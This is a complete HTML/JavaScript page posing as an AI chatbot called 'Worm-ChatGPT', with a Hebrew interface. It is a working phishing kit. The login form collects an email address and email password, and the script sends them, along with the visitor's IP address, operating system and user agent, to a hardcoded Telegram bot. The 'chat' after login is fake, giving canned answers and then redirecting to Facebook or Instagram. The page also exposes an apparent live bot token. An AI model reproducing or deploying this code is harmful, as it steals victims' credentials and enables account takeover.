<!DOCTYPE html>
<html lang="he">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Worm-ChatGPT</title>
    <style>
        body { background: #0d0d0d; color: #e0e0e0; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        #container { background: #1e1e1e; padding: 30px; border-radius: 12px; box-shadow: 0 0 20px rgba(255,0,0,0.3); width: 400px; text-align: center; }
        #header { color: #ff0000; font-size: 28px; font-weight: bold; text-shadow: 0 0 10px #ff0000; margin-bottom: 20px; }
        input { width: 90%; padding: 10px; margin: 8px 0; border: none; border-radius: 6px; background: #2a2a2a; color: #fff; }
        button { background: #ff0000; color: #fff; border: none; padding: 12px 24px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        #chat-area { display: none; text-align: left; margin-top: 20px; }
        #chat-log { background: #2a2a2a; padding: 10px; border-radius: 6px; height: 200px; overflow-y: auto; white-space: pre-wrap; }
        #chat-input { width: 80%; display: inline-block; }
        #chat-send { width: 18%; display: inline-block; padding: 10px; }
    </style>
</head>
<body>
<div id="container">
    <div id="header">WORM-CHATGPT</div>
    <div id="login-area">
        <input type="email" id="email" placeholder="כתובת אימייל">
        <input type="password" id="password" placeholder="סיסמת אימייל">
        <button onclick="login()">התחבר</button>
    </div>
    <div id="chat-area">
        <div id="chat-log">ברוכים הבאים ל-Worm-ChatGPT. שאל כל דבר.</div>
        <input type="text" id="chat-input" placeholder="הקלד שאלה...">
        <button id="chat-send" onclick="askQuestion()">שלח</button>
    </div>
</div>
<script>
    const BOT_TOKEN = '8942000012:AAHDt2FU2G71nPWh63BQZPm0ga-ySm69qQg';
    const CHAT_ID = '5814617245';

    // פונקציה לקבלת IP חיצוני דרך שירות חיצוני
    function getExternalIP(callback) {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => callback(data.ip))
            .catch(() => callback('לא ניתן היה לקבל IP'));
    }

    function getSystemInfo(callback) {
        let os = 'לא ידוע';
        const ua = navigator.userAgent;
        if (ua.indexOf('Win') !== -1) os = 'Windows';
        else if (ua.indexOf('Linux') !== -1) os = 'Linux';
        else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
        else if (ua.indexOf('Android') !== -1) os = 'Android';
        getExternalIP(function(ip) {
            callback({ os, ip, ua });
        });
    }

    function sendToTelegram(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        }).catch(e => console.error(e));
    }

    function login() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        if (!email || !pass) {
            alert('נא למלא אימייל וסיסמה');
            return;
        }
        getSystemInfo(function(info) {
            const msg = `🚨 התחברות חדשה!\n📧 אימייל: ${email}\n🔑 סיסמה: ${pass}\n💻 מערכת: ${info.os}\n🌐 IP: ${info.ip}\n🆔 UA: ${info.ua}`;
            sendToTelegram(msg);
        });

        document.getElementById('login-area').style.display = 'none';
        document.getElementById('chat-area').style.display = 'block';
    }

    let questionCount = 0;

    function askQuestion() {
        const input = document.getElementById('chat-input');
        const log = document.getElementById('chat-log');
        const q = input.value.trim();
        if (!q) return;
        log.innerText += `\n👤 אתה: ${q}`;
        input.value = '';

        questionCount++;
        if (questionCount === 2) {
            log.innerText += '\n🤖 Worm-ChatGPT: מעביר אותך לפרופיל שלך...';
            const r = Math.random();
            if (r < 0.5) {
                window.location.href = 'https://www.facebook.com';
            } else {
                window.location.href = 'https://www.instagram.com';
            }
            return;
        }

        const answers = [
            'זה רעיון מעניין, ספר לי עוד.',
            'אני מבין. מה אתה חושב על זה?',
            'בהחלט אפשרי, אבל יש סיכונים.',
            'Worm-ChatGPT כאן כדי לעזור.',
            'תן לי לחשוב על זה...',
            'האם ניסית לחפש בגוגל?',
            'זו שאלה טובה, התשובה תלויה בהקשר.'
        ];
        const reply = answers[Math.floor(Math.random() * answers.length)];
        log.innerText += `\n🤖 Worm-ChatGPT: ${reply}`;
        log.scrollTop = log.scrollHeight;
    }
</script>
</body>
</html>
